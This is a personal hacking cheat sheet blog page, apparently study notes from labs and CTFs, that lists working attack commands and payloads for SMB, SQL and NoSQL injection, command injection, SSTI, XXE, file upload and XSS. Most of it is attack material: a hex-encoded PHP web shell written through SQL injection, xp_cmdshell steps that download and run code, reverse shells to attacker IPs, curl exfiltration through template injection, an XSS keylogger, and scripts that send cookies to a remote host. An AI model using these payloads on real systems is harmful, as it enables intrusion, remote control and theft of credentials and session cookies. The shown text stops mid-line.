<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Notes | Hacking Cheatsheet</title><meta name=keywords content><meta name=description content="Samba What to do if samba port is open?
Check for usernames enum4linux -a 10.10.10.10 Smbclient smbclient -L //10.10.10.10 smbclient -L //10.10.10.10 -N No password (SMB Null session) smbclient --no-pass -L 10.10.10.10 smbclient //10.10.10.10/share_name nmap -script=smb-vuln\* -p445 192.168.103.40 Smbmap smbmap -H 10.10.10.10 smbmap -H 10.10.10.10 -u '' -p '' smbmap -H 10.10.10.10 -s share_name CrackMapExec crackmapexec smb 10.10.10.10 -u '' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares crackmapexec smb 10."><meta name=author content="allenxd"><link rel=canonical href=https://blog.allenxd.com/notes/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://blog.allenxd.com/home/braindump.png><link rel=icon type=image/png sizes=16x16 href=https://blog.allenxd.com/home/braindump.png><link rel=icon type=image/png sizes=32x32 href=https://blog.allenxd.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://blog.allenxd.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://blog.allenxd.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Notes"><meta property="og:description" content="Samba What to do if samba port is open?
Check for usernames enum4linux -a 10.10.10.10 Smbclient smbclient -L //10.10.10.10 smbclient -L //10.10.10.10 -N No password (SMB Null session) smbclient --no-pass -L 10.10.10.10 smbclient //10.10.10.10/share_name nmap -script=smb-vuln\* -p445 192.168.103.40 Smbmap smbmap -H 10.10.10.10 smbmap -H 10.10.10.10 -u '' -p '' smbmap -H 10.10.10.10 -s share_name CrackMapExec crackmapexec smb 10.10.10.10 -u '' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares crackmapexec smb 10."><meta property="og:type" content="article"><meta property="og:url" content="https://blog.allenxd.com/notes/"><meta property="og:image" content="https://blog.allenxd.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content><meta property="article:published_time" content="2021-07-27T00:00:00+00:00"><meta property="article:modified_time" content="2021-07-27T00:00:00+00:00"><meta property="og:site_name" content="haxxxnotes"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.allenxd.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Notes"><meta name=twitter:description content="Samba What to do if samba port is open?
Check for usernames enum4linux -a 10.10.10.10 Smbclient smbclient -L //10.10.10.10 smbclient -L //10.10.10.10 -N No password (SMB Null session) smbclient --no-pass -L 10.10.10.10 smbclient //10.10.10.10/share_name nmap -script=smb-vuln\* -p445 192.168.103.40 Smbmap smbmap -H 10.10.10.10 smbmap -H 10.10.10.10 -u '' -p '' smbmap -H 10.10.10.10 -s share_name CrackMapExec crackmapexec smb 10.10.10.10 -u '' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares crackmapexec smb 10."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Notes","item":"https://blog.allenxd.com/notes/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Notes","name":"Notes","description":"Samba What to do if samba port is open?\nCheck for usernames enum4linux -a 10.10.10.10 Smbclient smbclient -L //10.10.10.10 smbclient -L //10.10.10.10 -N No password (SMB Null session) smbclient --no-pass -L 10.10.10.10 smbclient //10.10.10.10/share_name nmap -script=smb-vuln\\* -p445 192.168.103.40 Smbmap smbmap -H 10.10.10.10 smbmap -H 10.10.10.10 -u '' -p '' smbmap -H 10.10.10.10 -s share_name CrackMapExec crackmapexec smb 10.10.10.10 -u '' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares crackmapexec smb 10.","keywords":[],"articleBody":"Samba What to do if samba port is open?\nCheck for usernames enum4linux -a 10.10.10.10 Smbclient smbclient -L //10.10.10.10 smbclient -L //10.10.10.10 -N No password (SMB Null session) smbclient --no-pass -L 10.10.10.10 smbclient //10.10.10.10/share_name nmap -script=smb-vuln\\* -p445 192.168.103.40 Smbmap smbmap -H 10.10.10.10 smbmap -H 10.10.10.10 -u '' -p '' smbmap -H 10.10.10.10 -s share_name CrackMapExec crackmapexec smb 10.10.10.10 -u '' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p '' --shares crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares crackmapexec smb 10.10.10.10 -u '' -p '' --share share_name SQLi Nice cheatsheet from hofmannsven\nWhen testing remember to try different comments -- - #\nSELECT name, description FROM products WHERE id=9; — queries the db for name and desc in product table where id=9 SELECT -column list- FROM -table- WHERE -condition-\nExample vulnerable code\n$id = $_GET['id'];\n\"SELECT name, desc FROM productes WHERE ID='$id';\";\n'a OR 'a'='a\nSELECT name, desc FROM products WHERE ID='' OR 'a'='a';\nUnion SELECT UNION SELECT statement;\nSELECT name, description FROM Products WHERE ID='3' UNION SELECT username, password FROM accounts\nWith group_concat — use when there’s only 1 column? and sql is only showing the first entry\n0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' sqli_one = db\n0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'\nstaff_users = table\nsingle column concat ' UNION SELECT username || '~' || password FROM users-- 1 UNION SELECT null,null,null,flag from exercise.secrets where flag is column, exercise is db, secrets is table \u003e null,null,null,null cause 4 columns\nSorting can the app sort stuff? inject! delete value of param, inject stuff Boundary Testing same as sorting order by 5 Error Based Payloads sqlwiki netspi\nMSSQL cast(@@version as integer) 1+AND+8671+IN+(SELECT+(CHAR(0)%2b(SELECT+(CASE+WHEN+(8671%3d8671)+THEN+(SELECT+STRING_AGG(flag,+',')+from+exercise.information_schema.columns+where+TABLE_NAME+=+'secrets') Postgresql cast(version() as integer) MYSQL extractvalue('',concat('\u003e',version())) Oracle to_char(dbms_xmlgen.getxml('select \"'|| (select substr(banner,0,30) from v$version where rownum=1)||'\" from sys.dual')) Stacked Queries asc;select+flag+from+flags; adding another query after the param value asc 1;WAITFOR DELAY '0:0:5'-- for postgresql ;SELECT+PG_SLEEP(5)-- Boolean (SELECT (CASE WHEN (4255=4255) THEN 1 ELSE (SELECT 9369 UNION SELECT 1823) END)) Reading and Writing Files Postgresql To read a file and then save to a table create table tmp(data text); copy tmp from '/etc/passwd'; select * from tmp; Alternative is select pg_read_file('/etc/passwd') MYSQL Check if mysql is configured to read all files SELECT @@GLOBAL.secure_file_priv; this will return what folder we have access to. If output is null meaning it is disabled and we can read anything. To write a file use into outfile SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt' The file location must be writable to the OS user the database software is running as. The /var/lib/mysql-files is the output of SELECT @@GLOBAL.secure_file_priv I have a note of into outfile in ReadME.md To read the file use load_file() SELECT LOAD_FILE('/var/lib/mysql-files/test.txt') Blind SQLi / Manual Bruteforce select substring(user() , 1, 1) = 'r';\n' or substr (user(), 1, 1)= 'a\nadmin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';\nadmin123' UNION SELECT 1,2,3 where database() like 's%';--\nadmin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--\nadmin123' UNION SELECT 1,2,3 from users where username like 'a%\nBlind SQL in a cookie TrackingId=xyz'||(SELECT '' FROM dual)||' test on cookie header TrackingId is a cookie\n'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM dual)||'\n'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator') ||'\n'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and lenght(password)\u003e1) ||'\n'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and substr(password,1,1)='a') ||'\nLimit output of rows = rownum=1 —same as Limit 1 for mysql This is syntax is for oracle - Dual is a default table\nupdating entry UPDATE wp_users SET user_pass=\"5f4dcc3b5aa765d61d8327deb882cf99\" where id=1 What to do when there is a confirmed injection point?\nDetermine how many columns using: ' UNION SELECT null;-- - or by using ORDER BY #– -\n' UNION SELECT 'asd', 'asd';-- - asd should appear somewhere\nNOTE Check if it accepts string or integer\nAfter enumerating the number of columns continue with Union injections Querying Version, db, Table_name, user() 1 union select 1, @@version, 3, 4\n1 union select 1, database(), 3, 4\n1 union select 1, table_name, 3, 4 fomr information_schema.tables\n1 union select 1, column_name, 3, 4 fomr information_schema.columns\n' UNION SELECT user(), 'asd';-- -\nOne column available get username and password or group_concat maybe?\n'+UNION+SELECT+NULL,username||'~'||password+FROM+users--\nUploading Shell SQLi ' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- - INTO OUTFILE '/var/www/html/shell.php output file to shell.php /var/www/html most common default location 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E Hex of \u003c?php echo \"\" . shell_exec($_GET[\"cmd\"]) . \"\";?\u003e or hex of the actual php reverse shell from pentest monkey sqli RCE MSsql xp_cmdshell takes a string and passes it to a cmd shell for execution Disabled by default If DB user has appropriate permissions we can enable xp_cmdshell using EXECUTE sp_configure 'show advanced options', 1; GO RECONFIGURE; GO EXECUTE sp_configure 'xp_cmdshell', 1; GO RECONFIGURE; GO MSSQL xp_cmdshell If xp_cmdshell is enabled call it using EXECUTE xp_cmdshell 'command to run here'; Linux does not support several functions If DB user has appropriate permissions we can enable xp_cmdshell using the ff: EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; enables xp_cmdshell then EXEC xp_cmdshell 'curl http://192.168.48.2:8000/a.sh'; EXEC xp_cmdshell 'bash a.sh'; In order of usage\nEXECUTE sp_configure 'show advanced options',1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'curl http://192.168.48.2:8000/itworked'; confirm RCE using this EXEC+xp_cmdshell+'curl+http://192.168.48.2:8000/RevShell.java+--output+%temp%/RevShell.java'; for windows EXEC xp_cmdshell 'java %temp%/RevShell.java'; for windows dont forget to url encode the % - To allow advance options to be changed. EXECUTE sp_configure 'show advanced options', 1; GO - To update the currently configured value for advance options. RECONFIGURE; GO - To enable xp_cmdshell EXECUTE sp_configure 'xp_cmdshell', 1; GO - To update currently config value for xp_cmdshell RECONFIGURE; GO example index.php?id=7%20UNION%20SELECT%20*%20from%20flags%20INTO%20OUTFILE%20%27/var/www/html/shell.php%27%20LINES%20TERMINATED%20BY%200x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E;--%20- SQLMap cheatsheet\nsqlmap -u -p [options]\nsqlmap -u \"http://test.site/view.php?id=1\" -p id --technique=U technique used is Union\nsqlmap -u \"http://test.site/view.php?id=1\" --tables\nsqlmap -u \"http://test.site/view.php?id=1\" --current-db -columns\nsqlmap -u \"http://test.site/view.php?id=1\" --current-db --dump\nsqlmap -u \"http://test.site/view.php?id=1\" -D -T -C --dump1\nsqlmap -u http://target/whatever --method POST --data \"db=mysql\u0026name=asd\u0026sort=id\u0026order=asc\" -p \"name,sort,order\"\n-p parameters to test with from --data --data post body sqlmap -u http://attack/whatever --method POST --data \"db=mysql\u0026name=asd\u0026sort=id\u0026order=asc\" -p \"name,sort,order\" --dbms=mysql --dump\n--dbms specify what dbms in use --dump dump all contents of all tables in the db For Post Params/data\nsqlmap -u --data= -p [options]\nSometimes you don’t need the ’\nid=1 OR 1=1\nNoSQLi MongoDB PayloadAlltheThings\ndefault port is 2701 mongo to start - show databases, use whatever db.createCollection(\"users\") , db.users.insert({id:\"1\", username: \"admin\", email: \"admin@test.test\", password: \"password\"}) , db.users.find() , db.users.update({id:\"2\"}, {$set: {username: \"test\"}}); .bson supports json username[$eq]=admin\u0026password[$ne]=asd collections = tables, documents = rows, fields = columns $and = AND, $or = OR $eq = matches records that equal to a certain value $ne = matches records that are not equal to a certain value $gt = matches records that are greater than a certain value. $where = matches records based on Javascript condition $exists = matches records that have a certain field $regex = matches records that satisfy certain regular expressions. mongo mongodb://admin:pass@192.168.120.186:27017/ Bruteforcing Basic Auth hydra -L user.txt -P rockyou.txt http-head /\nhydra -L user.txt -P rockyou.txt http-get /\nSMB hydra -L user.txt -P rockyou.txt -m smb or metasploit\nFTP hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.120.161 ftp\nTCPdump Monitor your injections with tcpdump Ping yourself and run tcpdump -i icmp\nPivoting/PortForwading/Tunneling Used msfconsole muti/handler Therennox YOTF writeup\nSocat Opening 8888 in the victim to connect to victim 22 in this scenario only localhosts is allowed to victim 22\n/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22\nread more here Muirlandoracle YOTF writeup or H0j3n’s\nReverse Shell Relay ./socat tcp-l:8000 tcp:ATTACKING_IP:443 \u0026\ntcp-l:8000 = used to create the first half of the connection – ipv4 listener on tcp port 8000 of the victim tcp:attacking_ip:443 = connects back to our local IP on port 443 \u0026 = backgrounds the listener This will connect back to our machine so we need to setup a netcat listener\n./nc-hyst 127.0.0.1 8000 -e /bin/bash\nPort Forwarding using Socat ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 \u0026\nWatch IPPSEC ProxyChains proxy a netcat proxychains nc 172.16.0.10 23\nwhen using nmap w/ proxychains comment out proxy_dns inside the proxychains.conf file\nonly tcp scan will work\nudp, syn and ping scan wont work - use -Pn\nPort Forwarding Local: From attacker to victim via SSH\nAttacker –ssh–\u003e 172.16.0.5 –http–\u003e 172.16.0.10\nssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN / ssh -i key -L 9000:10.10.10.75:80 10.10.10.73 f = backgrounds shell immediately N = tells SSH that it doesn;t need to execute any command and just set up the connection Now we can access the webserver on 172.16.0.10 using our own box localhost:8000 Use this when victim-localhost has open port that is only accessible by victim-localhost itself\nReverse Connection When doing this to avoid reverse shell and to only allow port forwarding add command=\"echo 'This account can only be used for port forwarding'\",no-agent-forwarding,no-x11-forwarding,no-pty at the beginning of the public key.\nWe have a shell on victim(05) and we want to use it as a reverse connection from our machine(20) to webserver_victim(10)\nssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN Plink.exe for Windows Command Line version of PuTTY SSH Client\nReverse Connection from Victim to our Attacker Machine. .20 Attacker — .05 Victim we have a shell from — .10 Webserver\ncmd.exe /c echo y | .\\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N For the keyfile we need to convert it using puttygen tool\nputtygen KEYFILE -o OUTPUT_KEY.ppk Reverse SSH Tunnel Use when port is only accessible by victim local\nssh -L 4444:10.10.125.232:8080\n4444 port of victim you will access from outside 10.10.125.232 victim’s ip 8080 local port you want to access inside the victim Web APP! Authentication Check created cookie is it a hashed value of user? change admin exist? try registering Admin add space before and after admin redirects to /login.php from / try intercepting response and change 302 Not Found to 200 OK Blacklisted? is X-Forwarded-For header allowed? Check timing might be different for username enumeration, make password extra long then check response time Blacklisted after a few tries? try alternating correct creds with bruteforced creds Valid users gets locked out Can be used to enum valid users PHP juggling bug send password as an array username=admin\u0026password[]= Code looks like this if(strcmp($_REQUEST['password'], $password) == 0) in the backend PHP compares input from a hardcoded string or db. 2FA Manually access /account-page when asked for 2fa? might be able to bypass Password Reset bypasses Use X-Forwarded-Host header. X-Forwarded-Host: your-exploit-server-id.web-security-academy.net REMOVE HTTPS log should show unique token for the victim SAML b64decode SAMLResponse - Important Part is Start SAML interaction \u003e Intercept SAMLResponse \u003e Tamper SAMLResponse \u003e Forward Malicious SAMLResponse to SP Base64 Decode SAMLResponse \u003e Change to Outh2 CSRF vulnerabilities Authorization IDOR Can’t IDOR directly? try in Edit, Delete, Modify etc. add .json extension? Object with multiple attributes when signing up user[username]=evo\u0026user[password]=evo\u0026submit=Submit maybe add user[admin]=true or 1? admin can also be exchanged to other stuff like organisation_id etc whatever is in use to bypass Authorization Code Injection Test with ' \" in every params just like sql. Some might give an error. we want it to error out then add a concat character(depends on what is used by website) example \"+\" for ruby. Or \"\" maybe. NOTE:REMEMBER TO URL ENCODE + %2b Errors out with \"? try example.com/?test=evo\".system(\"id\").\" . is used to concat in PHP when website is sorting via PHP try to input ' or \" again PHP version below 5 - Notice /pattern/? inject to /pattern/e then insert command phpinfo() to verify ‘.phpinfo().’ - replace phpinfo() with system(“id”) or what ever command Ruby + for concat command inside ` Perl . for concat command inside ` Python Sethsec + for concat str(os.popen(\"ls\").read()) str(__import__('os').system('id')) str(__import__('os').popen('id').read()) str(__import__('os').popen(__import__('base64').base64decode('')).read()) Check browser network if it’s loading any injectable params Command Injection Try all characters for chaining commands PayloadAlltheThings\nStraight out try backtick reverse shell or ping backtick or $() PayloadAlltheThings\ntry adding ; \u0026 | || at the end of the command aswell. EX: email=all3n@evo.test|sleep+5|\nthere’s a script in etc\nblind and can’t get a shell? maybe there’s a writable directory /images? whoami\u003e/var/www/images\nwe can use the semicolon (;), the logical AND (\u0026\u0026), the logical OR (||), and even a single pipe character (|)\nIn addition to the semicolon, which allows us to chain multiple commands together in one statement, another unique separator for Linux is the newline (\\n)\nURL encode. USE BURP.\nUse null statement $()\nThis technique also works for more complex payloads like nc -nlvp 9090, which becomes: n$()c -n$()lvp 9090 Convert to base64 then decode\necho+'Y2F0IC9ldGMvcGFzc3dkCg==+'|+base64+-d if no base64 use openssl Check for the following:\nLinux\nWindows\nNode.js reverse shell echo \"require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')\" \u003e /var/tmp/offsec.js ; node /var/tmp/offsec.js //tried with payloads in payload all the things but does not work needs the \u003e /var.... part at the end\nPHP php -r '$sock=fsockopen(\"192.168.49.51\",9090);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r instructs php to run the command in quotes $sock=fsockopen(\"192.168.49.51\",9090);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\"); $sock=fsockopen(\"192.168.49.51\",9090) establish a tcp socket to our attacker machine ;exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\"); will call the function exec if phpninfo() is available check for disable_functions and Document_root This worked for the year of the fox challenge Client side filtering for symbols - used burp to bypass filtering\n\"target\":\"\\\" ; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjE0LjUxLzcwMDMgMD4mMQ== | base64 -d | bash; echo\\\"\" this is a post request inside a search function \\ escapes the \" character\nDirectory Traversal ../../../../../../../etc/passwd try reading the php file with the parameter ex: file.php?file=/var/www/file.php If it loads blank maybe it requires you to start with specific directory. ex: this one requires to start with /var/www file.php?file=/var/www/../../../../../etc/passwd add %00 at the end ../../../../../etc/passwd%00 fixed in php version 5.3.4 try /etc/passwd without the ../../../../ ....//....//....//....//....//etc/passwd url encode = %2E%2E%2F double url encode = %252E%252E%252F File Inclusion Loads php files - look for something like ?page=index.php try injecting a ' or \" if it errors out Normal Directory traversal will work Try injecting remote sites like http://www.google.com or your own controlled site /?page=http://evohaxthepla.net/test.txt\u0026cmd=id test.txt contains a php one liner look for the following in the source code: include require include_once require_once php://filter/resource=/etc/passwd php://filter/convert.base64-encode/resource=/etc/passwd LFI to RCE via Log files include a malicious payload into services log files such as Apache, SSH, etc. then request log file via LFI Example, a user can include a malicious payload into an apache log file via User-Agent or other HTTP headers. In SSH, the user can inject a malicious payload in the username section. echo '\u003c?php echo 'whatever ';system($_GET['cmd']);?\u003e' \u003e whatever.php LDAP Test with ) if you’ll get an error PayloadAllthethings In a post request when signing in remove the whole post body ex: username=asd\u0026password=asd delete this whole data. adm*))%00 admin)(cn=*))%00\u0026password=admin Open Redirect PayloadAllthethings\nwebhook.site can be used to test? http and https is filtered can be bypassed by just doing //google.com check payloadallthethings for more CSRF What to look for?\nno csrf token, no samesite attribute on the cookie Remove CSRF token SameSite=Lax prevents CSRF Change POST to GET CSRF token is not user specific Intercept CSRF thru proxy then drop it - use the intercepted CSRF token on the other account check if it works SSRF Owasp\nBasically look for areas where the victim sends a request or downloads from another location ex: assets.test.com. And then try accessing localhost or other payloads. PayloadAllthethings Gopher gopher%3a//localhost%3a80/XPOST%2520/api/admin/create%2520HTTP/1.1%250aContent-Length%3a%252029%250aContent-Type%3a%2520application/x-www-form-urlencoded%250a%250ausername%3dhyst2%26password%3dhyst2 manually add %20 for spaces and %0a for new lines then urlencode the wholething try file:/// and all other methods aws 169.254.169.254 google cloud metadata.google.internal file:///c:/windows/win.ini file:///etc/passwd curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1 SSTI Nice labs from PortSwigger Look for injectable parameters and then fuzz - PayloadAllthethings has a good wordlists. Check template statements like ex: dropdown where you can choose if you want to display firstname, Lastname etc. try to break out of the template statement firstname}}{{7*7 Port Swigger Tornado lab in portswigger this worked {{2*2}}{%+import+os+%25}{{os.system('whoami')}} hacktricks ex: {% import os %}{{ os.popen(\"whoami\").read() }} After finding a vulnerable parameter and determining what template engine is used. go to PayloadAlltheThings to check for code executions. Templating Engine Language Server/client Side Twig PHP Server Side Freemarker Java Server Side Pug/Jade JavaScript Mostly Server Side Jinja Python Server Side Handlebars JavaScript Both Mustache Multiple Varies Twig \u003ch1\u003e\u003c?php echo $name ?\u003e Welcome to our site!\n\u003c?php if ($isAdmin) { echo \"You are the supreme leader and we love you\n\"; } ?\u003e {{7*7}} {{7*'7'}} both are ok = 49 Usually look for filter with =\u003e they can be used with system {{['cat flag.txt']|map('system')}} {{[0]|reduce('system','curl http://192.168.49.51/helloFromTheOtherSide')}} {% set output %} // used to exfill whoami from a form usigng craft cms {{[0]|reduce('system','whoami')}} {% endset %} {% set exfill= output| url_encode %} {{['curl http://192.168.49.191/a?exfill=' ~ exfill]|map('system')}} Freemarker \u003ch1\u003eHello ${name}!\u003c/h1\u003e // INTERPOLATION $ \u003c#if name == \"hacker\"\u003e //FTL TAG starts with # The top reasons you're great: \u003c#list reasons as reason\u003e ${reason?index + 1}: ${reason} \u003c/#list\u003e \u003c/#if\u003e more prone to xss as sometimes html is not escaped a ${7*7} ok ${7*'7'} not ${\"freemarker.template.utility.Execute\"?new()(\"whoami\")} Pug (jade) PAYLOAD GENERATOR h1 Hello, #{name} input(type='hidden' name='admin' value='true') if showSecret - secret = ['❤️','😍', '🤟'] p The secrets are: each val in secret p #{val} else p No secret for you! Commonly integrated with Express framework in a Nodejs app #{name} child_process.spawnSync executes commands (is not accessible by default need to require) can be checked by = require if no access use = global.process.mainModule.require PAYLOAD\n- var require = global.process.mainModule.require = require('child_process').spawnSync('whoami').stdout // will result to [object Object] without .spawnSync Jinja \u003ch1\u003eHey {{ name }}\u003c/h1\u003e {% if reasons %} Here are a couple of reasons why you are great: \u003cul\u003e {% for r in reasons %} \u003cli\u003e{{r}}\u003c/li\u003e {% endfor %} \u003c/ul\u003e {% endif %} {{5*\"5\"}} = 55555 {{config|pprint}} Handlebars / Mustache \u003ch1\u003eHello {{name}}\u003c/h1\u003e {{#if nicknames}} Also known as: {{#each nicknames}} {{this}} {{/each}} {{/if}} We are using handlebars locally in your browser to generate this template Mustache is logic-less only supports if statements Mustache is too restrictive thats why handlebars was created. check if Handlebars uses helpers specially read and readdir {{read \"/etc/passwd\"}} {{#each (readdir \"/etc\")}} {{this}} {{/each}} Craft CMS SSTI vulnerable sprout forms plugin blind ssti TPLMap Python2 only Snowscan usage of TPLmap on OZ HTB - Snowscan File Upload PayloadAlltheThings\nChange Content-Type For Apache web servers try uploading .htaccess with the following contents AddType application/x-httpd-php .l33t this will allow the extension .l33t and treat it as php. Learned from portswigger lab (although .phtml worked in their lab xD) add nullbyte and check if the web app strips the nullbyte and .jpg at the end. magic bytes upload a normal image strip some of the contents leave the magic bytes at the beginning then append your payload. or exiftool -Comment=\"\u003c?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?\u003e\" .jpg -o polyglot.php Race condition? for fileuploads that checks for viruses etc. might have a small window that we can execute a php payload. use turbo intruder. Portswigger Lab XXE PayloadAlltheThings\nCheck white spaces - only one newline from header!\nInformit XML structure\nDelete % from payloads you get in PayloadAlltheThings.\nif xml needs the \u003c\u003e as text xml needs to be enclosed in a CDATA section\nTesting for XXE\n\u003c?xml version=\"1.0\" ?\u003e \u003c!DOCTYPE data [ \u003c!ELEMENT data ANY \u003e \u003c!ENTITY lastname \"Replaced\"\u003e ]\u003e \u0026lastname; Tom Retrieving files \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE data [ \u003c!ELEMENT data ANY \u003e \u003c!ENTITY lastname SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u0026lastname; Tom Out of band Testing ssrf \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE data [ \u003c!ELEMENT data ANY \u003e \u003c!ENTITY lastname SYSTEM \"http:///somefile\"\u003e ]\u003e \u0026lastname; Tom Out of band dtd contents \u003c!ENTITY % content SYSTEM \"file:///etc/passwd\"\u003e \u003c!ENTITY % external \"\u003c!ENTITY \u0026#37; exfil SYSTEM 'http://your ip address/out?%content;'\u003e\" \u003e \u003c!ENTITY % content SYSTEM \"file:///etc/timezone\"\u003e \u003c!ENTITY % external \"\u003c!ENTITY \u0026#37; exfil SYSTEM 'http://your ip address/out?%content;'\u003e\" \u003e send this\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE oob [ \u003c!ENTITY % base SYSTEM \"http://your ip address/external.dtd\"\u003e %base; %external; %exfil; ]\u003e XPATH PayloadAlltheThings ' or 1=1}/parent::*/child::node()%00 XSS js can access cookies if they DO NOT HAVE the httpOnly flag enabled. PayloadAlltheThings Test in all inputs and params ? all tags blocked? use custom tag \u003cscript\u003e location = 'https://acd21f001f9a7723c0f207c1008700d5.web-security-academy.net/?search=#x'; \u003c/script\u003e not sure but this worked, from burpsuite acad %3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E read file xss? Keylogger function logKey(event){ fetch(\"http://attacker:8000/k?key=\"+ event.key) } document.addEventListener('keydown', logKey); Ref: https://developer.mozilla.org/en-US/docs/Web/API/Document/keydown_event\nReflected XSS Craft malicious link \u003e send to victim\nSearch functions http://blah.com/search?= Reflected Client XSS store in target then host the following asd.js const newDiv = document.createElement(\"script\"); const newContent = document.createTextNode('document.location=\"http://192.168.49.191/?c=\"+document.cookie'); newDiv.appendChild(newContent); const currentDiv = document.getElementById(\"div1\"); document.body.insertBefore(newDiv, currentDiv); or\ndocument.body.onload = addElement; function addElement () { // create a new script element const newDiv = document.createElement(\"script\"); const newContent = document.createTextNode('window.location=\"http://192.168.49.191/?c=\" + document.cookie'); newDiv.appendChild(newContent); const currentDiv = document.getElementById(\"div1\"); document.body.insertBefore(newDiv, currentDiv); } or\n/// https://bobbyhadz.com/blog/javascript-create-image-element const image = document.createElement('img'); // 👇️ Local image // image.setAttribute('src', 'my-img.png'); // 👇️ Remote image image.setAttribute( 'src', 'x', ); image.onerror = function handleError() { fetch(\"http://192.168.49.191/c?a=\" + document.cookie) // 👇️ Can set image.src to a backup image here // image.src = 'backup-image.png' // 👇️ Or hide image // image.style.display = 'none'; }; image.onload = function handleImageLoaded() { fetch(\"http://192.168.49.191/c?a=\" + document.cookie) // 👇️ Can set image.src to a backup image here // image.src = 'backup-image.png' // 👇️ Or hide image // image.style.display = 'none'; }; const box 